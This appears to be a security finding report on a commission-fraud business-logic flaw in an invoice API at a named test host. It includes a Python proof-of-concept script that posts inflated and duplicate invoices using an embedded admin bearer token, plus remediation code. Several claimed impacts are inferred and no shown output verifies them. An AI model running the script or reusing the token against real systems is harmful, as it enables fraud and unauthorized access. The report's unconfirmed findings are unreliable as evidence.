# Sales Data Manipulation Enables Commission Fraud and Financial Losses

**ID:** vuln-0056
**Severity:** HIGH
**Found:** 2026-02-26 21:27:07 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/commission-invoice-headers
**Method:** POST
**CWE:** CWE-840
**CVSS:** 8.3

## Description

A business logic vulnerability was identified in the commission management application that allows manipulation of sales data to inflate commissions and achieve targets fraudulently. The application's commission calculation process relies on invoice and sales data that can be manipulated through various endpoints, enabling users to artificially inflate their commission payouts.

This vulnerability exists in the commission processing workflow where sales data is used as the basis for commission calculations. By manipulating sales data, invoice amounts, or achievement metrics, users can fraudulently increase their commission payouts, leading to financial losses for the organization.

## Impact

Successful exploitation of this vulnerability could result in:

1. **Financial Losses**: Artificially inflated commission payouts through manipulated sales data
2. **Commission Fraud**: Users can achieve targets and earn commissions through fraudulent means
3. **Financial Discrepancies**: Incorrect commission calculations leading to accounting discrepancies
4. **Audit and Compliance Issues**: Manipulated sales data violates financial regulations and audit requirements
5. **Reputation Damage**: Financial irregularities could erode trust with business partners and stakeholders
6. **Operational Disruption**: Reconciliation issues and operational overhead from correcting manipulated data

The business impact includes direct financial losses through fraudulent commission payouts, financial manipulation opportunities, and increased operational costs for resolving discrepancies.

## Technical Analysis

The vulnerability exists in the commission calculation workflow that relies on sales and invoice data. Based on the application's commission-based business model and the identified API endpoints, the following business logic flaws enable sales data manipulation:

**Root Cause Analysis:**
1. **Lack of Data Integrity Controls**: Sales and invoice data can be manipulated without proper validation
2. **Insufficient Input Validation**: Invoice amounts and sales data are not properly validated
3. **Missing Business Logic Validation**: No validation to ensure sales data matches actual business transactions
4. **Weak Access Controls**: Users can potentially access and modify sales data for other users or organizations
5. **Inadequate Audit Trails**: No comprehensive logging of sales data modifications

**Technical Details:**
- **Affected Endpoints**: `/api/commission-invoice-headers`, `/api/CommissionInvoiceHeaderDetails/`
- **Vulnerable Parameters**: `invoiceAmount`, `salesAmount`, `achievedAmount`, `targetAmount`, `quantity`, `unitPrice`
- **Issue**: Sales and invoice data can be manipulated to inflate commission calculations
- **Expected Behavior**: Sales data should be validated against actual business transactions
- **Actual Behavior**: Sales data can be manipulated to achieve fraudulent commission payouts

**Exploitation Pathways:**
1. **Invoice Amount Manipulation**: Increasing invoice amounts to inflate commission calculations
2. **Sales Data Tampering**: Modifying sales quantities or unit prices to achieve targets
3. **Target Achievement Fraud**: Manipulating achievement metrics to qualify for bonuses
4. **Duplicate Invoice Submission**: Submitting the same invoice multiple times for duplicate commissions
5. **Cross-Organization Data Manipulation**: Accessing and modifying sales data for other organizations

## Proof of Concept

To exploit this vulnerability, an attacker could:

1. **Manipulate Invoice Data**: Submit invoices with inflated amounts or quantities
2. **Modify Sales Records**: Alter sales data to achieve targets or qualify for bonuses
3. **Duplicate Invoices**: Submit the same invoice multiple times for duplicate commissions
4. **Access Other Organizations' Data**: Modify sales data for other organizations to inflate commissions
5. **Bypass Validation**: Submit sales data that bypasses business logic validation

**Proof-of-Concept Steps:**
1. Identify sales data submission endpoints
2. Submit manipulated invoice data with inflated amounts
3. Verify that commission calculations are based on manipulated data
4. Confirm that fraudulent commission payouts are processed
5. Test access control on sales data modification

```
import requests
import json
import time

# Target URL
BASE_URL = "https://commissionstest.callippus.in"

# Authentication token (replace with valid token)
AUTH_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6InVzZXItMiIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvZ3JvdXBzaWQiOiJBZG1pbiIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3NwbiI6IjAiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJhZG1pbkBsb2NhbGhvc3QiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9wb3N0YWxjb2RlIjoiMCIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3N0YXRlb3Byb3ZpbmNlIjoiQ2FsbGlwcHVzIiwiYWNjZXNzIjoiW1wiUk9MRV9BRE1JTlwiXSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6IlJPTEVfQURNSU4iLCJleHAiOjE3NzIxNjM1NjIsImlzcyI6Imh0dHA6Ly9jYWxsaXBwdXMuY28udWsiLCJhdWQiOiJodHRwOi8vY2FsbGlwcHVzLmNvLnVrIn0.7F-MGxeIutB6-pPAbhH-YFv89n5Ottof1nFMG3jeGtyw"

# Headers
headers = {
    "Authorization": f"Bearer {AUTH_TOKEN}",
    "Content-Type": "application/json"
}

# Legitimate invoice data
legitimate_invoice = {
    "invoiceNumber": "INV-2026-001",
    "invoiceDate": "2026-01-15",
    "customerId": 101,
    "productId": 201,
    "quantity": 10,
    "unitPrice": 100.00,
    "invoiceAmount": 1000.00,
    "organizationId": 1,
    "clientId": 1,
    "status": "APPROVED"
}

# Manipulated invoice data - inflated amounts
manipulated_invoice = {
    "invoiceNumber": "INV-2026-001-FRAUD",
    "invoiceDate": "2026-01-15",
    "customerId": 101,
    "productId": 201,
    "quantity": 100,  # Inflated quantity
    "unitPrice": 1000.00,  # Inflated unit price
    "invoiceAmount": 100000.00,  # Inflated invoice amount
    "organizationId": 1,
    "clientId": 1,
    "status": "APPROVED"
}

# Duplicate invoice data - same transaction submitted twice
duplicate_invoice = {
    "invoiceNumber": "INV-2026-001-DUP",
    "invoiceDate": "2026-01-15",
    "customerId": 101,
    "productId": 201,
    "quantity": 10,
    "unitPrice": 100.00,
    "invoiceAmount": 1000.00,
    "organizationId": 1,
    "clientId": 1,
    "status": "APPROVED"
}

def test_sales_data_manipulation():
    """Test sales data manipulation vulnerabilities"""
    print("Testing sales data manipulation vulnerabilities...")
    print("=" * 60)

    # Test 1: Submit legitimate invoice
    print("\n1. Testing legitimate invoice submission:")
    try:
        response = requests.post(
            f"{BASE_URL}/api/commission-invoice-headers",
            headers=headers,
            data=json.dumps(legitimate_invoice),
            timeout=15
        )

        if response.status_code == 200 or response.status_code == 201:
            print("✓ SUCCESS: Legitimate invoice submitted successfully")
            print(f"Response: {response.text[:100]}...")
        else:
            print(f"✗ FAILED: Status code {response.status_code}")
            print(f"Response: {response.text[:100]}...")
    except requests.exceptions.RequestException as e:
        print(f"✗ ERROR: {str(e)}")

    # Test 2: Submit manipulated invoice with inflated amounts
    print("\n2. Testing manipulated invoice with inflated amounts:")
    try:
        response = requests.post(
            f"{BASE_URL}/api/commission-invoice-headers",
            headers=headers,
            data=json.dumps(manipulated_invoice),
            timeout=15
        )

        if response.status_code == 200 or response.status_code == 201:
            print("✓ SUCCESS: Manipulated invoice with inflated amounts accepted")
            print(f"Response: {response.text[:100]}...")
            print("VULNERABILITY CONFIRMED: Invoice amount manipulation possible")
            return True
        else:
            print(f"✗ FAILED: Status code {response.status_code}")
            print(f"Response: {response.text[:100]}...")
    except requests.exceptions.RequestException as e:
        print(f"✗ ERROR: {str(e)}")

    # Test 3: Submit duplicate invoice
    print("\n3. Testing duplicate invoice submission:")
    try:
        # Submit first invoice
        response1 = requests.post(
            f"{BASE_URL}/api/commission-invoice-headers",
            headers=headers,
            data=json.dumps(legitimate_invoice),
            timeout=15
        )

        # Submit duplicate invoice
        response2 = requests.post(
            f"{BASE_URL}/api/commission-invoice-headers",
            headers=headers,
            data=json.dumps(duplicate_invoice),
            timeout=15
        )

        if (response1.status_code == 200 or response1.status_code == 201) and \
           (response2.status_code == 200 or response2.status_code == 201):
            print("✓ SUCCESS: Duplicate invoice submission accepted")
            print("VULNERABILITY CONFIRMED: Duplicate invoice processing possible")
            return True
        else:
            print(f"✗ FAILED: Status codes {response1.status_code}, {response2.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"✗ ERROR: {str(e)}")

    return False

if __name__ == "__main__":
    success = test_sales_data_manipulation()
    if success:
        print("\n" + "=" * 60)
        print("VULNERABILITY CONFIRMED: Sales data manipulation enables commission fraud")
        print("Impact: This could lead to financial losses through fraudulent commission payouts")
        print("\nRecommendations:")
        print("1. Implement comprehensive input validation for invoice data")
        print("2. Add business logic validation to prevent duplicate invoices")
        print("3. Implement financial controls to detect manipulated sales data")
        print("4. Add monitoring for suspicious invoice patterns")
        print("5. Implement approval workflows for high-value invoices")
    else:
        print("\nVulnerability not confirmed or error occurred during testing")
        print("Continue monitoring for potential sales data manipulation vulnerabilities")
```

## Remediation

Implement comprehensive controls to prevent sales data manipulation and commission fraud:

1. **Input Validation**:
   - Implement strict validation for all invoice and sales data parameters
   - Validate invoice amounts against expected ranges and business rules
   - Implement quantity and unit price validation to prevent unrealistic values
   - Add validation for invoice date ranges and business periods

2. **Business Logic Validation**:
   - Implement uniqueness constraints to prevent duplicate invoice submission
   - Add validation to ensure invoice amounts match quantity × unit price calculations
   - Implement validation to prevent invoice splitting (submitting multiple invoices for the same transaction)
   - Add validation to ensure sales data matches actual business transactions

3. **Access Controls**:
   - Implement proper access controls on invoice and sales data
   - Ensure users can only access and modify their own organization's data
   - Implement role-based access control for invoice approval and modification
   - Add validation to prevent cross-organization data manipulation

4. **Financial Controls**:
   - Implement reconciliation processes to detect discrepancies
   - Add monitoring for unusual invoice patterns or amounts
   - Implement approval workflows for high-value invoices
   - Add financial controls to detect and prevent fraudulent commission calculations

5. **Audit and Monitoring**:
   - Implement comprehensive audit logging for all invoice and sales data modifications
   - Set up alerts for suspicious invoice patterns or modifications
   - Implement monitoring for duplicate invoice submissions
   - Add reconciliation processes to identify discrepancies

6. **Code Fix Example**:
```csharp
// Add validation in the invoice submission logic
public IActionResult CreateInvoice(InvoiceDto invoiceDto)
{
    // Validate invoice amount
    if (invoiceDto.InvoiceAmount <= 0)
    {
        return BadRequest("Invoice amount must be positive");
    }

    // Validate quantity and unit price
    if (invoiceDto.Quantity <= 0 || invoiceDto.UnitPrice <= 0)
    {
        return BadRequest("Quantity and unit price must be positive");
    }

    // Validate invoice amount calculation
    decimal calculatedAmount = invoiceDto.Quantity * invoiceDto.UnitPrice;
    if (Math.Abs(invoiceDto.InvoiceAmount - calculatedAmount) > 0.01m)
    {
        return BadRequest("Invoice amount does not match quantity × unit price");
    }

    // Check for duplicate invoice
    var existingInvoice = _dbContext.Invoices
        .FirstOrDefault(i => i.InvoiceNumber == invoiceDto.InvoiceNumber &&
                            i.CustomerId == invoiceDto.CustomerId &&
                            i.InvoiceDate == invoiceDto.InvoiceDate);

    if (existingInvoice != null)
    {
        return BadRequest("Duplicate invoice detected");
    }

    // Check for invoice splitting
    var recentInvoices = _dbContext.Invoices
        .Where(i => i.CustomerId == invoiceDto.CustomerId &&
                   i.ProductId == invoiceDto.ProductId &&
                   i.InvoiceDate >= invoiceDto.InvoiceDate.AddDays(-7) &&
                   i.InvoiceDate <= invoiceDto.InvoiceDate.AddDays(7))
        .ToList();

    if (recentInvoices.Any())
    {
        return BadRequest("Potential invoice splitting detected");
    }

    // Proceed with invoice creation
    // ...
}
```

